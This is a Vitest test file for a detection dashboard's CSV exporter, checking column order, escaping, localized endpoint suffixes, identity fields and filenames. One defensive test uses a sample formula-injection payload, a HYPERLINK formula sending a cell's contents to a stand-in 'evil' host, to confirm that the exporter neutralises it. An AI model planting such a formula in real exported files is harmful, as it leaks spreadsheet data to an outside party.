import { describe, expect, it } from "vitest";

import {
  AVERAGE_CSV_ROW_BYTES,
  buildExportFilename,
  CSV_COLUMN_KEYS,
  csvEscape,
  DEFAULT_CSV_HEADERS,
  formatCsvHeader,
  formatCsvRow,
  formatFilenameTimestamp,
  formatFilterSummary,
  LARGE_EXPORT_ROW_THRESHOLD,
  neutralizeFormula,
} from "@/lib/detection/csv-export";
import type { Filter } from "@/lib/detection/filter";
import type { Event } from "@/lib/detection/types";

describe("csvEscape", () => {
  it("passes through plain values", () => {
    expect(csvEscape("10.0.0.1")).toBe("10.0.0.1");
    expect(csvEscape("HttpThreat")).toBe("HttpThreat");
  });

  it("quotes and escapes values with commas, quotes, or newlines", () => {
    expect(csvEscape("a,b")).toBe('"a,b"');
    expect(csvEscape('say "hi"')).toBe('"say ""hi"""');
    expect(csvEscape("line\r\n2")).toBe('"line\r\n2"');
  });

  it("returns an empty string as-is, not as an empty quoted field", () => {
    // RFC 4180 permits unquoted empty fields; quoting them adds
    // noise to every empty cell and inflates the download size.
    expect(csvEscape("")).toBe("");
  });
});

describe("formatCsvHeader", () => {
  it("writes every column key in the declared order, terminated by CRLF", () => {
    const header = formatCsvHeader(DEFAULT_CSV_HEADERS);
    expect(header.endsWith("\r\n")).toBe(true);
    const cells = header.replace(/\r\n$/, "").split(",");
    expect(cells.length).toBe(CSV_COLUMN_KEYS.length);
    // Column order mirrors the result row's left-to-right reading
    // order (severity badge first, hostname last after the Phase
    // Detection-28 identity columns). Lock the ends so drift either
    // way is caught.
    expect(cells[0]).toBe(DEFAULT_CSV_HEADERS.level);
    expect(cells[cells.length - 1]).toBe(DEFAULT_CSV_HEADERS.hostname);
  });

  it("mirrors the result row's column order exactly", () => {
    expect([...CSV_COLUMN_KEYS]).toEqual([
      "level",
      "time",
      "kind",
      "attackKind",
      "category",
      "confidence",
      "triage",
      "source",
      "destination",
      "sensor",
      "userName",
      "hostname",
    ]);
  });
});

function buildEvent(overrides: Partial<Event> = {}): Event {
  return {
    __typename: "HttpThreat",
    time: "2026-04-22T00:00:00.000Z",
    sensor: "sensor-1",
    confidence: 0.8,
    category: "LATERAL_MOVEMENT",
    level: "HIGH",
    triageScores: null,
    ...overrides,
  } as Event;
}

const ROW_OPTIONS = {
  levelLabels: { LOW: "Low", MEDIUM: "Medium", HIGH: "High" },
  categoryLabels: {
    LATERAL_MOVEMENT: "Lateral Movement",
    COMMAND_AND_CONTROL: "Command and Control",
  },
  countryUnknown: "??",
  countryUnavailable: "—",
  triageSummaryTemplate: "{count} policies · {max} max",
  moreCountSuffixTemplate: "+{count} more",
};

// Mirrors the KR locale bundle (`src/i18n/messages/ko.json`) so the
// formatter tests lock the Korean shape of the plural-endpoint
// suffix alongside the English one. The UI renders `+{count}개 더`
// via `ResultListLabels.moreCountSuffix`; the CSV must match or KR
// downloads drift from what the operator sees in the result row.
const ROW_OPTIONS_KR = {
  ...ROW_OPTIONS,
  triageSummaryTemplate: "{count}건 정책 · 최대 {max}",
  moreCountSuffixTemplate: "+{count}개 더",
};

describe("formatCsvRow", () => {
  it("emits visible columns in the configured order with country inlined", () => {
    const event = buildEvent({
      origAddr: "10.0.0.5",
      origPort: 1234,
      origCountry: "US",
      respAddr: "10.0.0.6",
      respPort: 443,
      respCountry: "KR",
    } as unknown as Partial<Event>);
    const row = formatCsvRow(event, ROW_OPTIONS);
    expect(row.endsWith("\r\n")).toBe(true);
    // The endpoint cells contain spaces, so a naive comma split is
    // safe here (no commas in the values themselves), but the
    // inlined `(US)` / `(KR)` parens must end up appended to the
    // address — matching `EndpointPart` in the result list. Column
    // positions mirror the result row (severity badge first, sensor
    // last): level, time, kind, attackKind, category, confidence,
    // triage, source, destination, sensor.
    const cells = row.replace(/\r\n$/, "").split(",");
    expect(cells[0]).toBe("High");
    expect(cells[1]).toBe("2026-04-22T00:00:00.000Z");
    expect(cells[2]).toBe("HTTP Threat");
    expect(cells[4]).toBe("Lateral Movement");
    expect(cells[5]).toBe("0.80");
    expect(cells[6]).toBe("");
    expect(cells[7]).toBe("10.0.0.5:1234 (US)");
    expect(cells[8]).toBe("10.0.0.6:443 (KR)");
    expect(cells[9]).toBe("sensor-1");
  });

  it("leaves addressing columns empty for subtypes without an endpoint", () => {
    // WindowsThreat carries no origAddr / respAddr at all.
    const event = buildEvent({
      __typename: "WindowsThreat",
      level: "LOW",
      category: null,
    } as unknown as Partial<Event>);
    const row = formatCsvRow(event, ROW_OPTIONS);
    const cells = row.replace(/\r\n$/, "").split(",");
    // Source / destination moved to indices 7 / 8 after triage was
    // reseated between confidence and source.
    expect(cells[7]).toBe("");
    expect(cells[8]).toBe("");
    expect(cells[0]).toBe("Low");
    expect(cells[4]).toBe("");
  });

  it("falls back to the raw __typename when no friendly name is registered", () => {
    const event = buildEvent({
      __typename: "UnregisteredKind",
    } as unknown as Partial<Event>);
    const row = formatCsvRow(event, ROW_OPTIONS);
    const cells = row.replace(/\r\n$/, "").split(",");
    expect(cells[2]).toBe("UnregisteredKind");
  });

  it("quotes values that contain a comma or quote", () => {
    // A sensor name with a comma must not widen the row's column
    // count — csvEscape must quote it and escape embedded quotes.
    const event = buildEvent({ sensor: 'site-a, "primary"' });
    const row = formatCsvRow(event, ROW_OPTIONS);
    expect(row).toContain('"site-a, ""primary"""');
  });

  it("falls back to plural addressing fields for subtypes without singular fields", () => {
    // ExternalDdos: origAddrs (plural), respAddr (singular). The
    // result list's pickEndpoint uses the first plural entry as the
    // primary address with the rest as +N extras; the CSV must do
    // the same or it drops endpoint data the list row is showing.
    const event = buildEvent({
      __typename: "ExternalDdos",
      origAddr: undefined,
      origAddrs: ["1.1.1.1", "2.2.2.2", "3.3.3.3"],
      origCountry: undefined,
      origCountries: ["US", "KR"],
      respAddr: "10.0.0.6",
      respPort: 443,
      respCountry: "KR",
    } as unknown as Partial<Event>);
    const row = formatCsvRow(event, ROW_OPTIONS);
    const cells = row.replace(/\r\n$/, "").split(",");
    // Extra countries are NOT surfaced — EndpointPart in result-list
    // only renders the primary country via `formatCountryShort`,
    // never the `+N more` summary. Source is now cells[7] /
    // destination cells[8] after the column reorder.
    expect(cells[7]).toBe("1.1.1.1 (+2 more) (US)");
    expect(cells[8]).toBe("10.0.0.6:443 (KR)");
  });

  it("uses plural respPorts[0] as the primary port for PortScan", () => {
    // PortScan carries respAddr (singular) plus respPorts (plural)
    // and no respPort. The UI renders `respAddr:ports[0]` + "+N".
    // Reading only respPort would strip the port entirely.
    const event = buildEvent({
      __typename: "PortScan",
      origAddr: "10.0.0.5",
      origCountry: "US",
      respAddr: "10.0.0.6",
      respCountry: "KR",
      respPorts: [80, 443, 8080],
    } as unknown as Partial<Event>);
    const row = formatCsvRow(event, ROW_OPTIONS);
    const cells = row.replace(/\r\n$/, "").split(",");
    expect(cells[8]).toBe("10.0.0.6:80 (+2 more) (KR)");
  });

  it("handles MultiHostPortScan's plural respAddrs alongside a singular respPort", () => {
    const event = buildEvent({
      __typename: "MultiHostPortScan",
      origAddr: "10.0.0.5",
      origCountry: "US",
      respAddr: undefined,
      respAddrs: ["10.0.0.6", "10.0.0.7"],
      respPort: 22,
      respCountry: undefined,
      respCountries: ["KR"],
    } as unknown as Partial<Event>);
    const row = formatCsvRow(event, ROW_OPTIONS);
    const cells = row.replace(/\r\n$/, "").split(",");
    expect(cells[8]).toBe("10.0.0.6:22 (+1 more) (KR)");
  });

  it("leaves the source endpoint blank when UnusualDestinationPattern carries no origAddr", () => {
    const event = buildEvent({
      __typename: "UnusualDestinationPattern",
      respAddr: undefined,
      respAddrs: ["10.0.0.6", "10.0.0.7"],
      respCountry: undefined,
      respCountries: ["KR", "US"],
    } as unknown as Partial<Event>);
    const row = formatCsvRow(event, ROW_OPTIONS);
    const cells = row.replace(/\r\n$/, "").split(",");
    expect(cells[7]).toBe("");
    // Only the primary country (`KR`) is surfaced — the extra `US`
    // that `respCountries` carried is dropped, because EndpointPart
    // does not surface extra countries.
    expect(cells[8]).toBe("10.0.0.6 (+1 more) (KR)");
  });

  it("renders the plural-endpoint suffix using the KR locale template", () => {
    // The UI's result row renders the `+N more` hint through
    // `ResultListLabels.moreCountSuffix`, which resolves to
    // `+{count}개 더` in KR. The CSV must mirror that exact string
    // for plural-address subtypes (here ExternalDdos), or the KR
    // download diverges from what the operator sees in the source
    // column. Falling back to English `(+N more)` would silently
    // skip localization — that is the Round 11 regression.
    const event = buildEvent({
      __typename: "ExternalDdos",
      origAddr: undefined,
      origAddrs: ["1.1.1.1", "2.2.2.2", "3.3.3.3"],
      origCountry: undefined,
      origCountries: ["US"],
      respAddr: "10.0.0.6",
      respPort: 443,
      respCountry: "KR",
    } as unknown as Partial<Event>);
    const row = formatCsvRow(event, ROW_OPTIONS_KR);
    const cells = row.replace(/\r\n$/, "").split(",");
    expect(cells[7]).toBe("1.1.1.1 (+2개 더) (US)");
    expect(cells[8]).toBe("10.0.0.6:443 (KR)");
  });

  it("uses the KR triage template and moreCountSuffix together on a PortScan row", () => {
    // PortScan exercises both the triage and more-count suffix
    // templates in the same row: the triage cell must pull
    // `{count}건 정책 · 최대 {max}` and the destination cell must
    // quote `+{count}개 더`. The combination catches a regression
    // where only one of the two templates is localized.
    const event = buildEvent({
      __typename: "PortScan",
      origAddr: "10.0.0.5",
      origCountry: "US",
      respAddr: "10.0.0.6",
      respCountry: "KR",
      respPorts: [80, 443, 8080],
      triageScores: [
        { policyId: "p1", score: 0.25 },
        { policyId: "p2", score: 0.9 },
      ],
    } as unknown as Partial<Event>);
    const row = formatCsvRow(event, ROW_OPTIONS_KR);
    const cells = row.replace(/\r\n$/, "").split(",");
    expect(cells[6]).toBe("2건 정책 · 최대 0.90");
    expect(cells[8]).toBe("10.0.0.6:80 (+2개 더) (KR)");
  });

  it("falls back to the English `+N more` shape when the template omits {count}", () => {
    // A malformed locale bundle (missing `{count}` placeholder)
    // should still produce a readable cell — the fallback keeps
    // the cell useful instead of writing a literal `{count}` into
    // the download. Mirrors the same defensive fallback the
    // triage formatter would apply if its template were blank.
    const event = buildEvent({
      __typename: "ExternalDdos",
      origAddr: undefined,
      origAddrs: ["1.1.1.1", "2.2.2.2"],
      origCountry: "US",
      respAddr: "10.0.0.6",
      respPort: 443,
      respCountry: "KR",
    } as unknown as Partial<Event>);
    const row = formatCsvRow(event, {
      ...ROW_OPTIONS,
      moreCountSuffixTemplate: "overflow",
    });
    const cells = row.replace(/\r\n$/, "").split(",");
    expect(cells[7]).toBe("1.1.1.1 (+1 more) (US)");
  });

  it("maps the `XX` / `ZZ` sentinel country codes to the locale labels", () => {
    // Mirrors `formatCountryShort` in the result list: the upstream
    // datasource emits `XX` for "unknown origin" and `ZZ` for
    // "unavailable"; the UI surfaces them as the locale's friendly
    // labels. The CSV must match or the cell diverges from what the
    // operator sees in the source / destination column.
    const event = buildEvent({
      origAddr: "10.0.0.5",
      origPort: 1234,
      origCountry: "XX",
      respAddr: "10.0.0.6",
      respPort: 443,
      respCountry: "ZZ",
    } as unknown as Partial<Event>);
    const row = formatCsvRow(event, ROW_OPTIONS);
    const cells = row.replace(/\r\n$/, "").split(",");
    expect(cells[7]).toBe("10.0.0.5:1234 (??)");
    expect(cells[8]).toBe("10.0.0.6:443 (—)");
  });

  it("renders triage as a single cell mirroring TriageSummary's locale template", () => {
    // The UI renders triage as one `TriageSummary` token (e.g.
    // "3 policies · 0.90 max") — the CSV must emit one cell in the
    // same position, not the previous `Triage Policies` /
    // `Triage Max Score` split, or the column count / order drifts
    // from what the operator sees in the result row.
    const event = buildEvent({
      triageScores: [
        { policyId: "p1", score: 0.25 },
        { policyId: "p2", score: 0.9 },
        { policyId: "p3", score: 0.4 },
      ],
    });
    const row = formatCsvRow(event, ROW_OPTIONS);
    const cells = row.replace(/\r\n$/, "").split(",");
    expect(cells[6]).toBe("3 policies · 0.90 max");
    // Source / destination land after triage, not before it — the
    // result row shows triage on the top line and endpoints below.
    // The Phase Detection-28 identity columns (userName, hostname)
    // tail the row at indices 10 / 11.
    expect(cells.length).toBe(12);
  });

  it("leaves the triage cell empty when no scores are present", () => {
    // Mirrors `TriageSummary` returning `null` for missing /
    // empty triage scores — the CSV column position stays put,
    // the cell is just blank.
    const event = buildEvent({ triageScores: null });
    const row = formatCsvRow(event, ROW_OPTIONS);
    const cells = row.replace(/\r\n$/, "").split(",");
    expect(cells[6]).toBe("");
  });

  it("emits userName / hostname cells from the Phase Detection-28 identity columns", () => {
    // HttpThreat carries both `username` and `host` per the schema.
    // The CSV must surface them at the trailing identity slots so a
    // download mirrors the result row's userName / hostname cells.
    const event = buildEvent({
      origAddr: "10.0.0.5",
      origPort: 1234,
      origCountry: "US",
      respAddr: "10.0.0.6",
      respPort: 443,
      respCountry: "KR",
      username: "jdoe",
      host: "mail.example.com",
    } as unknown as Partial<Event>);
    const row = formatCsvRow(event, ROW_OPTIONS);
    const cells = row.replace(/\r\n$/, "").split(",");
    expect(cells.length).toBe(12);
    expect(cells[10]).toBe("jdoe");
    expect(cells[11]).toBe("mail.example.com");
  });

  it("falls back to the schema's `user` and `hostname` field names for FTP / NTLM subtypes", () => {
    // BlocklistFtp uses `user` (documented as Username) and has no
    // host/hostname. BlocklistNtlm uses `hostname`. The CSV reader
    // must coalesce both onto the same userName / hostname columns.
    const ftpRow = formatCsvRow(
      buildEvent({
        __typename: "BlocklistFtp",
        origAddr: "10.0.0.5",
        respAddr: "10.0.0.6",
        user: "alice",
      } as unknown as Partial<Event>),
      ROW_OPTIONS,
    );
    const ftpCells = ftpRow.replace(/\r\n$/, "").split(",");
    expect(ftpCells[10]).toBe("alice");
    expect(ftpCells[11]).toBe("");

    const ntlmRow = formatCsvRow(
      buildEvent({
        __typename: "BlocklistNtlm",
        origAddr: "10.0.0.5",
        respAddr: "10.0.0.6",
        hostname: "client01.corp.local",
      } as unknown as Partial<Event>),
      ROW_OPTIONS,
    );
    const ntlmCells = ntlmRow.replace(/\r\n$/, "").split(",");
    expect(ntlmCells[10]).toBe("");
    expect(ntlmCells[11]).toBe("client01.corp.local");
  });

  it("reads the camelCase `userName` field on BlocklistRadius (the schema outlier)", () => {
    // BlocklistRadius is the only curated subtype that uses the
    // camelCase `userName` field. The CSV exporter must coalesce
    // it onto the userName column the same way as the lowercase
    // `username` and `user` variants. Locks the
    // `readEventIdentity` fall-through against a refactor that
    // drops the camelCase branch.
    const row = formatCsvRow(
      buildEvent({
        __typename: "BlocklistRadius",
        origAddr: "10.0.0.5",
        respAddr: "10.0.0.6",
        userName: "radius-user",
      } as unknown as Partial<Event>),
      ROW_OPTIONS,
    );
    const cells = row.replace(/\r\n$/, "").split(",");
    expect(cells[10]).toBe("radius-user");
    expect(cells[11]).toBe("");
  });

  it("reads the `user` field on WindowsThreat (no host/hostname)", () => {
    // WindowsThreat surfaces `user` (documented as Username) but
    // no host/hostname field. The CSV exporter must coalesce it
    // onto the userName column and leave the hostname column
    // empty — the same shape the result row renders.
    const row = formatCsvRow(
      buildEvent({
        __typename: "WindowsThreat",
        user: "DOMAIN\\agent",
      } as unknown as Partial<Event>),
      ROW_OPTIONS,
    );
    const cells = row.replace(/\r\n$/, "").split(",");
    expect(cells[10]).toBe("DOMAIN\\agent");
    expect(cells[11]).toBe("");
  });

  it("leaves the identity columns empty for subtypes whose schema emits neither field", () => {
    // BlocklistConn carries no userName / host / hostname. The
    // column position must stay put — cells[10] and cells[11] are
    // empty, mirroring the row's `—` fallback as a blank cell so
    // downstream tooling sees a fixed column layout.
    const event = buildEvent({
      __typename: "BlocklistConn",
      origAddr: "10.0.0.5",
      respAddr: "10.0.0.6",
    } as unknown as Partial<Event>);
    const row = formatCsvRow(event, ROW_OPTIONS);
    const cells = row.replace(/\r\n$/, "").split(",");
    expect(cells.length).toBe(12);
    expect(cells[10]).toBe("");
    expect(cells[11]).toBe("");
  });

  it("neutralises spreadsheet-formula injection in event-derived cells", () => {
    // Values starting with `=`, `+`, `-`, `@`, tab or CR are
    // evaluated as formulas by Excel / Google Sheets even when
    // wrapped in RFC 4180 quotes. Prefixing them with `'` keeps
    // them as literal strings. Worst case: a sensor or attack
    // kind controlled by a hostile upstream.
    const event = buildEvent({
      sensor: '=HYPERLINK("http://evil/?x="&A1)',
    });
    const row = formatCsvRow(event, ROW_OPTIONS);
    const cells = row.replace(/\r\n$/, "").split(",");
    // Sensor moved to index 9 after the column reorder.
    // The cell becomes a quoted literal whose contents start with
    // the apostrophe — Excel renders `'=HYPERLINK(...)` as text.
    expect(cells[9]).toBe('"\'=HYPERLINK(""http://evil/?x=""&A1)"');
  });
});

describe("neutralizeFormula", () => {
  it("prefixes a single quote when the cell starts with a formula trigger", () => {
    expect(neutralizeFormula("=1+1")).toBe("'=1+1");
    expect(neutralizeFormula("+1")).toBe("'+1");
    expect(neutralizeFormula("-1")).toBe("'-1");
    expect(neutralizeFormula("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(neutralizeFormula("\tcmd")).toBe("'\tcmd");
    expect(neutralizeFormula("\rcmd")).toBe("'\rcmd");
  });

  it("passes safe values through unchanged", () => {
    expect(neutralizeFormula("")).toBe("");
    expect(neutralizeFormula("10.0.0.1")).toBe("10.0.0.1");
    expect(neutralizeFormula("HttpThreat")).toBe("HttpThreat");
    // A `-` mid-value is safe; only a leading trigger matters.
    expect(neutralizeFormula("sensor-1")).toBe("sensor-1");
  });
});

describe("formatFilenameTimestamp", () => {
  it("produces a filename-safe ISO prefix with colons replaced", () => {
    const ts = formatFilenameTimestamp(new Date("2026-04-20T15:32:07.123Z"));
    expect(ts).toBe("2026-04-20T15-32");
    expect(ts).not.toContain(":");
  });
});

describe("formatFilterSummary", () => {
  it("uses the period slug when a period chip was committed", () => {
    const filter: Filter = {
      mode: "structured",
      input: {
        start: "2026-04-20T14:00:00.000Z",
        end: "2026-04-20T15:00:00.000Z",
      },
    };
    expect(formatFilterSummary(filter, { periodKey: "1h" })).toBe("last-1h");
  });

  it("falls back to the explicit range when no period slug is supplied", () => {
    const filter: Filter = {
      mode: "structured",
      input: {
        start: "2026-04-20T14:00:00.000Z",
        end: "2026-04-21T14:00:00.000Z",
      },
    };
    expect(formatFilterSummary(filter)).toBe("2026-04-20_to_2026-04-21");
  });

  it("reports `all` when the filter has no time bounds", () => {
    const filter: Filter = { mode: "structured", input: {} };
    expect(formatFilterSummary(filter)).toBe("all");
  });
});

describe("buildExportFilename", () => {
  it("composes timestamp and summary around the detection-events prefix", () => {
    const filter: Filter = {
      mode: "structured",
      input: {
        start: "2026-04-20T14:00:00.000Z",
        end: "2026-04-20T15:00:00.000Z",
      },
    };
    const filename = buildExportFilename(filter, {
      periodKey: "1h",
      timestamp: new Date("2026-04-20T15:32:07.123Z"),
    });
    expect(filename).toBe("detection-events_2026-04-20T15-32_last-1h.csv");
  });

  it("never produces a filename with characters that break OS path rules", () => {
    const filter: Filter = {
      mode: "structured",
      input: {
        start: "2026-04-20T00:00:00.000Z",
        end: "2026-04-21T00:00:00.000Z",
      },
    };
    const filename = buildExportFilename(filter, {
      timestamp: new Date("2026-04-20T15:32:07.123Z"),
    });
    // Path-illegal characters (colons, slashes, backslashes, etc.)
    // must not appear — Windows rejects `:` in a filename outright
    // and some archive tools mangle `/`.
    expect(filename).not.toMatch(/[:\\/*?"<>|]/);
  });
});

describe("export guardrail constants", () => {
  it("pins the confirmation threshold at 100 000 rows", () => {
    // The umbrella issue quotes the threshold as "e.g. 100,000"; the
    // constant is load-bearing because the client quotes it in the
    // Narrow filter copy. Lock it against silent drift.
    expect(LARGE_EXPORT_ROW_THRESHOLD).toBe(100_000);
  });

  it("exposes a per-row byte estimate so the dialog can quote a size", () => {
    expect(AVERAGE_CSV_ROW_BYTES).toBeGreaterThan(0);
  });
});
